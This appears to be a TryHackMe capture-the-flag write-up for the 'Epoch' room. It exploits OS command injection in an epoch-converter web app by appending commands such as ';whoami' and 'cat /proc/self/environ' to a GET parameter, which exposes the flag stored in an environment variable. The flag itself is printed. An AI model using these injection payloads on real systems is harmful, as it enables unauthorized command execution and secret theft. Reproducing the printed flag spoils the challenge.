# Epoch - TryHackMe — CTF Writeup

- **OS:** Linux
- **Target IP:** `10.112.139.47`

---

## Enumeration

### Nmap Scan

Starting with a service and port scan using Nmap:

```bash
nmap -sV -sC -A 10.114.179.194
```

**Output:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 5e:08:a4:6a:0d:27:e7:9a:58:c0:13:f7:ea:b4:20:1e (RSA)
|   256 18:6d:e0:e0:75:8b:f6:cd:ab:38:0a:02:29:e0:32:fb (ECDSA)
|_  256 c1:4b:ca:5f:27:d4:14:46:ea:af:06:85:b5:37:82:bc (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

Two open ports were found:

- **22** — SSH
- **80** — HTTP web application

### Web Application Fingerprinting

Fetching the web application on port 80:

```bash
curl -X GET http://10.114.179.194
```

The response revealed a simple **Epoch to UTC converter** built with Bootstrap 4. The application accepts a single `epoch` parameter via a GET form and returns the converted timestamp.

---

## Vulnerability Research

The application takes user input (an epoch timestamp) and appears to process it server-side, likely passing it to a system command or interpreter. This is a classic pattern for **OS Command Injection**, where unsanitized user input is concatenated directly into a shell command.

The `main.go` file found later confirmed the application is written in **Go 1.15.7** and runs on the server as the `challenge` user.

---

## Exploitation

### Command Injection

The `epoch` parameter was tested for command injection by appending a shell command after a semicolon:

```
GET /?epoch=123;+whoami HTTP/1.1
```

The server executed the injected command, confirming the vulnerability. With arbitrary command execution established, the next step was enumerating the system.

### System Enumeration

Listing the home directory of the `challenge` user:

```
GET /?epoch=123;+ls+-la+/home/challenge
```

**Output:**

```
-rw-r--r-- 1 root root      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 root root     3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 root root      807 Feb 25  2020 .profile
-rw-rw-r-- 1 root root      236 Mar  2  2022 go.mod
-rw-rw-r-- 1 root root    52843 Mar  2  2022 go.sum
-rwxr-xr-x 1 root root 14014363 Mar  2  2022 main
-rw-rw-r-- 1 root root     1164 Mar  2  2022 main.go
drwxrwxr-x 1 root root     4096 Mar  2  2022 views
```

No `flag.txt` was found in the home directory. Standard files like `.bashrc` and `.profile` were inspected but contained no useful information.

### Flag Discovery — Environment Variables

After exhausting the filesystem, the process **environment variables** were inspected by reading `/proc/self/environ`:

```
GET /?epoch=123;+cat+/proc/self/environ
```

**Output:**

```
HOSTNAME=e7c1352e71ec
PWD=/home/challenge
HOME=/home/challenge
GOLANG_VERSION=1.15.7
FLAG=flag{7da6c7debd40bd611560c13d8149b647}
SHLVL=1
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

The flag was stored as an **environment variable** — a trick commonly used in CTF challenges to hide flags in plain sight outside the filesystem.

**Flag:**

```
flag{7da6c7debd40bd611560c13d8149b647}
```

---

## Key Takeaways

The `epoch` parameter was passed unsanitized to a shell command, enabling arbitrary OS command execution. The flag was not stored in a typical location like `~/flag.txt` but rather injected into the process environment at container startup — a reminder to always enumerate environment variables during post-exploitation, especially in containerized environments (note the Docker-style hostname `e7c1352e71ec`).

---

## Tools Summary

| Tool | Purpose | Usage |
|------|---------|-------|
| Nmap | Network scanner | Port discovery and service/version detection |
| curl | HTTP client | Web application fingerprinting and manual injection testing |
